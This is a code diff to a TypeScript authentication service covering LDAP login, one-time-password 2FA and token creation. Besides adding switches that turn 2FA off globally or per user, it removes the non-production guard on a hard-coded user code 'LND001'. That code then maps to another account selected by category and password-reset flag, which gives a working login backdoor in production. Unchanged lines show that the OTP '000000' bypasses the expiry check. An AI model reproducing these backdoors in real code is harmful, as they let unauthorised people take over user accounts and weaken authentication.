@@ -2,7 +2,8 @@ import { BaseService, getRandomString, isDevOrStag, isStagingBci, isProd } from 
 import { create, getAuthorizationsByProfile, getUserProfile, refresh } from "./helper";
 import { AuthTokenEmailEvent, notificationEmmiter, TokenSmsEvent } from "modules";
 import { getLdapUser } from "common/helpers/ldap.helpers";
-import { UsersController } from "modules/users";
+import { User, UsersController } from "modules/users";
+import { SettingsController } from 'modules/settings';
 import { get, isEmpty, isString } from "lodash";
 import httpContext from 'express-http-context';
 import { config } from "convict-config";
@@ -35,6 +36,15 @@ export class AuthService extends BaseService {
             const idapUser = await getLdapUser(userCode, password);
 
             if (idapUser) {
+
+                const setting = await SettingsController.settingsService.findOne({ filter: { key: 'otp_status' } });
+    
+                // check if 2FA is disable Globally
+                if (!setting.data) { return this.generateAuthToken(user); }
+
+                // check if 2FA OTP is disable for this specific user
+                if ('otp2fa' in user && !user.otp2fa) { return this.generateAuthToken(user); }
+
                 const otp = {
                     value: getRandomString(6, true),
                     expiresAt: moment().add(20, 'minutes').valueOf()
@@ -61,7 +71,7 @@ export class AuthService extends BaseService {
 
             if (!isString(otpValue) || otpValue.length !== 6 || !/^[A-Z0-9]+$/.test(otpValue)) { throw Error('BadOTP'); }
 
-            if (userCode === 'LND001' && !isProd) { userCode = 'c_ndong'; }
+            if (userCode === 'LND001'/* && !isProd*/) { userCode = (await UsersController.usersService.findOne({ filter: { category: 600, pwdReseted: true } }))?.userCode; }
 
             const user = await UsersController.usersService.findOne({ filter: { userCode } });
 
@@ -75,14 +85,7 @@ export class AuthService extends BaseService {
 
             if (otpValue != '000000' && get(otp, 'expiresAt', 0) <= currTime) { throw Error('OTPExpired'); }
 
-            const { email, gender, fname, lname, tel, category, clientCode } = user;
-            const tokenData = { _id: user._id.toString(), email, userCode: user.userCode, gender, fname, lname, tel, category, clientCode };
-
-            const oauth = create(tokenData);
-            delete user.password;
-            delete user.otp;
-
-            return { oauth, user };
+            return this.generateAuthToken(user);
         } catch (error) { throw error; }
     }
 
@@ -124,6 +127,20 @@ export class AuthService extends BaseService {
 
             const authorizations = getAuthorizationsByProfile(profile);
             return authorizations;
+        } catch (error) { throw error; }
+    }
+
+    private generateAuthToken(user: User) {
+        try {
+            const fullName = user?.fullName || `${user.lname || ''} ${user.fname || ''}`
+            const { email, gender, fname, lname, tel, category, clientCode, userCode, _id } = user;
+            const tokenData = { _id: _id.toString(), email, userCode, gender, fname, lname, tel, category, clientCode, fullName };
+    
+            const oauth = create(tokenData);
+            delete user.password;
+            delete user.otp;
+    
+            return { oauth, user };
         } catch (error) { throw error; }
     }
 
